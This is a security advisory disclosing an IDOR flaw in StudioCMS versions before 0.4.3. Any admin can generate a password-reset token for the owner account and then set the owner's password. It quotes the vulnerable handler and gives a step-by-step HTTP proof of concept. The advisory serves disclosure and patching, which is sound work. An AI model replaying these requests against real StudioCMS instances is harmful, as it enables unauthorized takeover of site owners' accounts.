# [M] StudioCMS: IDOR — Admin-to-Owner Account Takeover via Password Reset Link Generation

## Summary
Severity: Medium
Advisory: GHSA-h7vr-cg25-jf8c
CVE: CVE-2026-32103
CWE: CWE-639
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:N/I:H/A:N (CVSS_V3)
Published: 2026-03-12
Source: https://github.com/advisories/GHSA-h7vr-cg25-jf8c
Type: github-advisory

## Affected
- npm: `studiocms` — affected >=0 <0.4.3

## Details
## Summary
The POST /studiocms_api/dashboard/create-reset-link endpoint allows any authenticated user with admin privileges to generate a password reset token for any other user, including the owner account. The handler verifies that the caller is an admin but does not enforce role hierarchy, nor does it validate that the target userId matches the caller's identity. Combined with the POST /studiocms_api/dashboard/reset-password endpoint, this allows a complete account takeover of the highest-privileged account in the system.

## Details
#### Vulnerable Code
**File:** packages/studiocms/frontend/pages/studiocms_api/dashboard/create-reset-link.ts
**Version:** studiocms@0.3.0
```
const isAuthorized = ctx.locals.StudioCMS.security?.userPermissionLevel.isAdmin;  // [1]
if (!isAuthorized) {
    return apiResponseLogger(403, 'Unauthorized');
}

const { userId } = yield* readAPIContextJson<{ userId: string }>(ctx);            // [2]

if (!userId) {
    return apiResponseLogger(400, 'Invalid form data, userId is required');
}

// [3] userId is passed directly — no check against caller's identity
// [4] No check whether the target user outranks the caller
const token = yield* sdk.resetTokenBucket.new(userId);                            // [5]
```
#### Analysis
Unlike the API token endpoints (which only require isEditor), this handler correctly gates access at the isAdmin level [1]. However, two critical authorization checks are still missing:
1. **No caller identity validation [2][3]:** The userId from the JSON payload is never compared against the authenticated caller's session identity. An admin can specify any user's UUID, including the owner's.
2. **No role hierarchy enforcement [4]:** The handler does not verify whether the target user has a higher privilege level than the caller. An admin can target the owner account, which is the only account that should be immune to administrative actions from lower-ranked admins.
3. **Reset token returned in response [5]:** The generated reset token (a signed JWT) is returned directly in the HTTP response body. This token can then be used with the reset-password endpoint to set an arbitrary password for the target account, completing the account takeover chain.

The core issue is that password reset generation is treated as a generic admin operation rather than a self-service operation with explicit scope restrictions.

## PoC
**Environment**
*User ID | Role*
2450bf33-0135-4142-80be-9854f9a5e9f1 | owner
eacee42e-ae7e-4e9e-945b-68e26696ece4 | admin

**Step 1 — Verify Attacker's Session (Admin)**
Confirm the attacker is authenticated as admin (user dummy03):
```
POST /studiocms_api/dashboard/verify-session HTTP/1.1
Host: 127.0.0.1:4321
Cookie: auth_session=<admin_session_cookie>
Content-Type: application/json

{"originPathname":"http://127.0.0.1:4321/dashboard"}
```
Response:
```
{
  "isLoggedIn": true,
  "user": {
    "id": "eacee42e-ae7e-4e9e-945b-68e26696ece4",
    "name": "dummy03",
    "username": "dummy03"
  },
  "permissionLevel": "admin"
}
```

**Step 2 — Generate Password Reset Token for the Owner**
The admin sends a request to create a reset link targeting the owner's UUID:
```
POST /studiocms_api/dashboard/create-reset-link HTTP/1.1
Host: 127.0.0.1:4321
Cookie: auth_session=<admin_session_cookie>
Content-Type: application/json

{"userId": "2450bf33-0135-4142-80be-9854f9a5e9f1"}
```
Response:
```
{
  "id": "e11c98ac-d523-4404-b9c6-921d7d01cdcd",
  "userId": "2450bf33-0135-4142-80be-9854f9a5e9f1",
  "token": "<reset_jwt_token>"
}
```
The server generated a valid password reset JWT for the owner account and returned it to the admin caller.

**Step 3 — Reset the Owner's Password**
Using all three values from the previous response (id, userId, token), the attacker sets a new password for the owner:
```
POST /studiocms_api/dashboard/reset-password HTTP/1.1
Host: 127.0.0.1:4321
Cookie: auth_session=<admin_session_cookie>
Content-Type: application/json

{
  "id": "e11c98ac-d523-4404-b9c6-921d7d01cdcd",
  "userid": "2450bf33-0135-4142-80be-9854f9a5e9f1",
  "token": "<reset_jwt_token>",
  "password": "pwned1234@@",
  "confirm_password": "pwned1234@@"
}
```
Response:
```
{"message": "User password updated successfully"}
```
The owner's password has been changed. The admin can now log in as the owner with the new credentials, gaining full control of the StudioCMS instance.

## Impact
- **Owner Account Takeover:** Any admin can change the owner's password and assume full control of the StudioCMS instance, including all content, user management, and system configuration.

## References
- https://github.com/withstudiocms/studiocms/security/advisories/GHSA-h7vr-cg25-jf8c
- https://nvd.nist.gov/vuln/detail/CVE-2026-32103
- https://github.com/withstudiocms/studiocms
